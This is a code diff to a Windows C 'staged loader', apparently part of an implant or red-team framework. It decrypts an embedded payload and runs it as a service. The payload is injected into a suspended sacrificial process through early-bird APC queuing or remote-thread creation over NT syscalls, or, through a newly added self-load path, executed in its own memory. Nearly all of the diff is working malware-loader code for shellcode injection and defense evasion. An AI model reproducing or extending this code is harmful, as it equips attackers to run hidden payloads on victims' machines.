@@ -92,8 +92,12 @@ static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"host" */
 #ifndef STAGED_LOADER_NO_SERVICE
 static SERVICE_STATUS_HANDLE g_svc_handle = NULL;
 #endif
+#if !defined(SELF_LOAD) || !defined(STAGED_LOADER_NO_SERVICE)
 static HANDLE g_stop_event = NULL; /* signaled by the control handler       */
-static HANDLE g_child = NULL;      /* sacrificial process (kill on stop)    */
+#endif
+#ifndef SELF_LOAD
+static HANDLE g_child = NULL; /* sacrificial process (kill on stop)    */
+#endif
 #if INJECT_DEBUG_CHILD
 static void *g_inject_base = NULL; /* remote region holding trampoline+blob */
 static SIZE_T g_inject_size = 0;
@@ -195,6 +199,10 @@ static int decrypt_payload(unsigned char **payload, size_t *payload_len) {
  *
  * Returns the stub size in bytes.
  */
+#ifndef SELF_LOAD
+/* --------------------------------------------------------- remote injection
+ * Everything below is compiled out when --inject self is selected. */
+#ifndef CLASSIC_INJECT
 static size_t build_trampoline(unsigned char *buf, uintptr_t tramp_addr,
                                uintptr_t blob_addr, uintptr_t sleep_addr) {
 #ifdef _WIN64
@@ -246,6 +254,7 @@ static size_t build_trampoline(unsigned char *buf, uintptr_t tramp_addr,
 /* NT syscall layer lives in core/modules/common/ntsys.{c,h}. */
 
 /* ---- unified injection primitives: NT syscalls on x64 (ntsys), Win32 ---- */
+#endif
 
 static BOOL inj_alloc_rw(HANDLE hproc, SIZE_T total, unsigned char **out) {
   *out = NULL;
@@ -286,6 +295,7 @@ static BOOL inj_protect_rx(HANDLE hproc, void *base, SIZE_T len) {
   }
 }
 
+#ifndef CLASSIC_INJECT
 static BOOL inj_queue_apc(HANDLE hthread, void *routine) {
 #if NTSYS_HAVE
   if (ntsys_ready()) {
@@ -297,7 +307,9 @@ static BOOL inj_queue_apc(HANDLE hthread, void *routine) {
    * fails with ERROR_INVALID_HANDLE. */
   return QueueUserAPC((PAPCFUNC)(ULONG_PTR)routine, hthread, 0) != 0;
 }
+#endif /* !CLASSIC_INJECT */
 
+#ifdef CLASSIC_INJECT
 static HANDLE inj_create_thread(HANDLE hproc, void *routine) {
 #if NTSYS_HAVE
   if (ntsys_ready()) {
@@ -323,6 +335,8 @@ static HANDLE inj_create_thread(HANDLE hproc, void *routine) {
  */
 /* spawn_sacrificial resolves SACRIFICIAL_PROCESS and starts it suspended.
  * Fills pi on success; on failure no child handles are open. */
+#endif /* CLASSIC_INJECT */
+
 static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
   wchar_t sysdir[MAX_PATH];
   wchar_t sac_path[MAX_PATH];
@@ -556,6 +570,7 @@ static DWORD inject_fail(PROCESS_INFORMATION *pi, void *base, DWORD err) {
  * a Win32 error code. On success the child keeps running with the agent
  * inside it. This is the default path.
  */
+#ifndef CLASSIC_INJECT
 static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
   PROCESS_INFORMATION pi;
   unsigned char tramp[32];
@@ -645,6 +660,9 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
  * may exit right after the payload starts. Compiled in when CLASSIC_INJECT
  * is defined (build.sh --inject ct).
  */
+#endif
+
+#ifdef CLASSIC_INJECT
 static DWORD do_inject_ct(const unsigned char *payload, size_t payload_len) {
   PROCESS_INFORMATION pi;
   unsigned char *base = NULL;
@@ -694,39 +712,72 @@ static DWORD do_inject_ct(const unsigned char *payload, size_t payload_len) {
 
   return verify_child(&pi);
 }
+#endif
 
-/* do_inject dispatches to the build-time selected injection flavor. */
+/* do_inject runs the build-time selected remote-injection flavor. */
 static DWORD do_inject(const unsigned char *payload, size_t payload_len) {
 #ifdef CLASSIC_INJECT
-  /* Keep the early-bird path referenced so -Wall does not flag it as unused
-   * in classic builds (both flavors stay in the tree for future builds). */
-  (void)do_inject_apc;
   return do_inject_ct(payload, payload_len);
 #else
-  /* Mirror fix: keep the classic path referenced in early-bird builds. */
-  (void)do_inject_ct;
   return do_inject_apc(payload, payload_len);
 #endif
 }
+#endif /* !SELF_LOAD */
 
-/* run_once performs a single foreground injection with the embedded blob. */
+/* self_load runs the blob in the loader process. Selected with
+ * --inject self; the caller owns the thread for the life of the payload. */
+#ifdef SELF_LOAD
+static int self_load(const unsigned char *payload, size_t payload_len) {
+  void *base;
+  DWORD old = 0;
+
+  base =
+      VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  if (base == NULL) {
+    LOG(L"self-load: VirtualAlloc failed: %lu", GetLastError());
+    return -1;
+  }
+  memcpy(base, payload, payload_len);
+  if (!VirtualProtect(base, payload_len, PAGE_EXECUTE_READ, &old)) {
+    LOG(L"self-load: VirtualProtect failed: %lu", GetLastError());
+    VirtualFree(base, 0, MEM_RELEASE);
+    return -1;
+  }
+  FlushInstructionCache(GetCurrentProcess(), base, payload_len);
+
+  LOG(L"self-load: entering PICO at %p", base);
+  ((void(WINAPI *)(void *))base)(NULL);
+  VirtualFree(base, 0, MEM_RELEASE);
+  return 0;
+}
+#endif /* SELF_LOAD */
+
+/* run_once performs a single foreground run of the embedded blob. */
 static int run_once(void) {
   unsigned char *payload = NULL;
   size_t payload_len = 0;
+#ifdef SELF_LOAD
+  int self_err;
+#else
   DWORD err;
+#endif
 
   if (decrypt_payload(&payload, &payload_len) != 0) {
     return 1;
   }
+#ifdef SELF_LOAD
+  self_err = self_load(payload, payload_len);
+  free(payload);
+  return self_err == 0 ? 0 : 1;
+#else
   err = do_inject(payload, payload_len);
   free(payload);
-  if (err == NO_ERROR) {
-    return 0;
+  if (err != NO_ERROR) {
+    LOG(L"injection failed (error %lu)", err);
+    return 1;
   }
-#ifdef DEBUG
-  wprint(L"operation failed (error %lu)\n", err);
+  return 0;
 #endif
-  return 1;
 }
 
 /* --------------------------------------------------------------- service */
@@ -766,9 +817,11 @@ static DWORD WINAPI ctrl_handler(DWORD ctrl, DWORD evt_type, void *evt_data,
      * stop event / dead child and perform its own handle cleanup. We never
      * close the shared handle here (do_inject owns it) to avoid a
      * double-close race; a redundant TerminateProcess is harmless. */
+#ifndef SELF_LOAD
     if (g_child != NULL) {
       TerminateProcess(g_child, 1);
     }
+#endif
     SetEvent(g_stop_event);
     return NO_ERROR;
   case SERVICE_CONTROL_INTERROGATE:
@@ -800,6 +853,10 @@ static VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
     err = ERROR_RESOURCE_DATA_NOT_FOUND;
   } else {
     report_status(SERVICE_RUNNING, NO_ERROR, 0, 0);
+#ifdef SELF_LOAD
+    err = self_load(payload, payload_len) == 0 ? NO_ERROR : ERROR_GEN_FAILURE;
+    free(payload);
+#else
     err = do_inject(payload, payload_len);
     free(payload);
     /* Normal service lifecycle: after a successful injection stay resident
@@ -813,6 +870,7 @@ static VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
     } else if (err == NO_ERROR && g_stop_event != NULL) {
       WaitForSingleObject(g_stop_event, INFINITE);
     }
+#endif
   }
 
   report_status(SERVICE_STOPPED, err, 0, 0);
